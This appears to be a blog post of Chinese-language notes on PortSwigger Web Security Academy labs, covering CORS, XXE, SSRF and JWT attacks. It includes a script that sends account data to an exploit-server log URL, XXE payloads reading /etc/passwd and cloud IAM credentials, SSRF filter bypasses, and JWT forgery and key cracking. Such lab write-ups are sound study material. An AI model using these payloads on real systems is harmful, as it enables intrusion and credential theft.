+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	CORS vulnerability with trusted insecure protocols</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">子域名	both HTTPS <span class="keyword">and</span> HTTP.</span><br><span class="line">Origin: http://0a0f005a0373c6998144842200d20096.web-security-academy.net</span><br><span class="line">Origin: http://<span class="number">123.0</span>a0f005a0373c6998144842200d20096.web-security-academy.net</span><br><span class="line"></span><br><span class="line">stock.lab_id.net	url参数productId存在xss</span><br><span class="line">	&lt;u&gt;<span class="number">123</span>&lt;/u&gt;	查看页面是否存在下划线</span><br><span class="line">    	此处输入正常的字符不返回输入参数 但是输入奇怪字符返回了</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.location=<span class="string">&quot;http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&amp;storeId=1&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Exploiting XXE using external entities to retrieve files</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">mime text 		发送检测 &lt;?xml</span><br><span class="line">声明之后添加&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt; ]&gt;</span><br><span class="line">找地方调用&amp;xxe;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt; ]&gt;&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;<span class="number">1</span>&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Exploiting XXE to perform SSRF attacks</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">已知内网地址http://<span class="number">169.254</span><span class="number">.169</span><span class="number">.254</span></span><br><span class="line">根据提示一步一步插入</span><br><span class="line">[ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;http://169.254.169.254&quot;</span>&gt; ]</span><br><span class="line">[ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;http://169.254.169.254/latest&quot;</span>&gt; ]</span><br><span class="line">[ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;http://169.254.169.254/latest/meta-data&quot;</span>&gt; ]</span><br><span class="line">[ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;http://169.254.169.254/latest/meta-data/iam&quot;</span>&gt; ]</span><br><span class="line">[ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials&quot;</span>&gt; ]</span><br><span class="line">[ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;</span>&gt; ]</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;!DOCTYPE test 插入[ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;</span>&gt; ]&gt;&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;<span class="number">1</span>&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Basic SSRF against the local server</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stockApi=http://localhost/admin		显示下面的路径</span><br><span class="line">stockApi=http://localhost/admin/delete?username=carlos</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Basic SSRF against another back-end system</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stockApi=http%3A%2F%2F192<span class="number">.168</span><span class="number">.0</span><span class="number">.1</span>%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1</span><br><span class="line"></span><br><span class="line">stockApi=http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>/admin	把<span class="number">1</span>改成<span class="number">1</span>-<span class="number">255</span>爆破</span><br><span class="line">stockApi=http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.48</span>:<span class="number">8080</span>/admin/delete?username=carlos</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	SSRF with blacklist-based input filter</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1</span><br><span class="line"></span><br><span class="line">盲猜过滤了localhost <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> admin</span><br><span class="line">stockApi=http://<span class="number">127.1</span></span><br><span class="line">stockApi=http://<span class="number">127.1</span>/%2561dmin</span><br><span class="line">stockApi=http://<span class="number">127.1</span>/%2561dmin/delete?username=carlos</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	SSRF with filter bypass via open redirection vulnerability</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">页面隐藏了/product/nextProduct?currentProductId=<span class="number">1</span>&amp;path=/product?productId=<span class="number">2</span>	填到stockApi</span><br><span class="line">爆破ip和端口</span><br><span class="line">stockApi=/product/nextProduct?path=http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.12</span>:<span class="number">8080</span>/admin</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Blind SSRF with out-of-band detection</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">服务器使用了分析软件分析请求头的refer</span><br><span class="line">修改请求包的refer 为burp的dns地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	JWT authentication bypass via unverified signature</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">https://baijiahao.baidu.com/s?<span class="built_in">id</span>=<span class="number">1740581922153922714</span>&amp;wfr=spider&amp;<span class="keyword">for</span>=pc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">POST	/login</span><br><span class="line">	csrf=EtVdyCdD33GnlUuRuQJCSZrpjhjYdQa7&amp;username=wiener&amp;password=peter</span><br><span class="line">	返回</span><br><span class="line">	Set-Cookie: session=eyJraWQiOiJmOTE1MmE1NC1jMzQxLTQ4ODktYTI5NC1mZmYwNGM5ZjM2NWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4MDU5MTM1MX0.J_XNoIB2xsS8Q4C4E_LGeqQn4kbX8e5j7jQnV_M3eZ_s0elPAwm1n2cR8M4nIHf3_Ft-6wcC_rvI-wHVGk-S7Nls_PO9WhEiHv9Q6YA3DppUQSljFSh0tHqDRmDdflrtKDil4l9l9QpPG6OxFy8XGpL59jnfLaOUFdD2IQlSz2gJ5lw82oo9jpHAnF2vYX1XVTTTu6si0q-Mf1sdODEXWou72GfJIG3C8zbJj3Xp9k31pKdNM50b4kEZp7DQ3F4Jo9RdBjEw17FT54Qj1i0YxDieRh5Sp9KGTKdWySLYoowLTW5S3bv8zdJtFN5n7OAx7a3x3FS_cLIERdl_b7tcGQ</span><br><span class="line">	jwt解码 headers payloads</span><br><span class="line">	&#123;&quot;kid&quot;:&quot;f9152a54-c341-4889-a294-fff04c9f365e&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125;</span><br><span class="line">	&#123;&quot;iss&quot;:&quot;portswigger&quot;,&quot;sub&quot;:&quot;wiener&quot;,&quot;exp&quot;:168059039Nn</span><br><span class="line">2.</span><br><span class="line">GET 	/my-account</span><br><span class="line">	Cookie: session=....</span><br><span class="line"></span><br><span class="line">base64编解码</span><br><span class="line">eyJraWQiOiJmOTE1MmE1NC1jMzQxLTQ4ODktYTI5NC1mZmYwNGM5ZjM2NWUiLCJhbGciOiJSUzI1NiJ9</span><br><span class="line">eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4MDU5MDM5Nn</span><br><span class="line">&#123;&quot;kid&quot;:&quot;f9152a54-c341-4889-a294-fff04c9f365e&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125;</span><br><span class="line">&#123;&quot;iss&quot;:&quot;portswigger&quot;,&quot;sub&quot;:&quot;wiener&quot;,&quot;exp&quot;:168059039Nn</span><br><span class="line">burp的decoder模块解码是有问题 应该为</span><br><span class="line">&#123;&quot;iss&quot;:&quot;portswigger&quot;,&quot;sub&quot;:&quot;wiener&quot;,&quot;exp&quot;:168059039&#125;</span><br><span class="line">但是repeater的inspector解出来是没问题的 网页的在线解码也是没问题的</span><br><span class="line">本题需要只需将sub的wiener改成adminstrator编码回去即可登录账号</span><br><span class="line">后续操作中每一个cookie中的session都去这么修改</span><br><span class="line">相当于cookie中的session是管理员的唯一凭证</span><br><span class="line"></span><br><span class="line">正常登录</span><br><span class="line">/login session=空---&gt;&gt;302</span><br><span class="line">/my-account session=...---&gt;&gt;200登陆成功</span><br><span class="line"></span><br><span class="line">/my-account 修改session的jwt且服务端没有对jwt进一步验证---&gt;越权成功</span><br><span class="line">session由jwt组成 可以破解且没有验证</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230404143022786.png" alt="image-20230404143022786"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	JWT authentication bypass via flawed signature verification</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">jwt</span><br><span class="line">	headers中alg--&gt;none</span><br><span class="line">	payload中sub--&gt;administrator</span><br><span class="line">	signature删掉</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id><a href="#" class="headerlink" title></a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	JWT authentication bypass via weak signing key</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">hashcat -a <span class="number">0</span> -m <span class="number">16500</span> eyJraWQiOiI5Mzk4MmE5My1lNWNlLTQ1OWQtOWQ1ZC1lNWFhMzMwMmQ4YjYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4MDU5ODIyOH0.j9NAvbWKngjpCXYnYoOdVdwHUVVXzd94L5lsKfgOOPM /home/hyy19/test_jwt.txt</span><br><span class="line">破解为secret1</span><br><span class="line">使用jwt.io网站 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230404160412695.png" alt="image-20230404160412695"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	JWT authentication bypass via jwk header injection</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">jwk(json web key)注入也可以形成jws(json web signature)</span><br><span class="line">	理性情况下 服务器只使用公钥白名单来验证JWT签名，但对于一些相关配置错误的服务器会使用JWK参数中嵌入任何密钥来进行验证，攻击者就可以利用这一行为，使用自己的RSA私钥对修改过的JWT进行签名，然后再JWK头部中嵌入对应公钥进行越权。</span><br><span class="line">    下图中为看的方便修改用 . 换行</span><br><span class="line">        第一部分为原图</span><br><span class="line">        第二部分为payload部分sub的wiener改administrator	修改payload部分</span><br><span class="line">        第三部分使用burp插件的JWT Editor Keys 修改headers和signature部分</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230404200110265.png" alt="image-20230404200110265"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JWT Editor Key的使用首先生成RSA密钥--&gt;&gt;new RSA key</span><br><span class="line">然后再repeater部分</span><br><span class="line">单机左下角Attack修改jwt最后发包完成攻击</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230404200753499.png" alt="image-20230404200753499"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜测键值n是是公钥</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230404201540183.png" alt="image-20230404201540183"></p>
+<p><img src="/2023/07/25/portswigger/image-20230404201707410.png" alt="image-20230404201707410"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Hyy</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://huyaoyao2019.github.io/2023/07/25/portswigger/">http://huyaoyao2019.github.io/2023/07/25/portswigger/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Hyy</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">您的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2023/07/25/portswigger/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="portswigger">
+                        
+                        <span class="card-title">portswigger</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Hyy
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/07/25/vulnhub/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="vulnhub">
+                        
+                        <span class="card-title">vulnhub</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Hyy
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">Hyy</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/huyaoyao2019" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
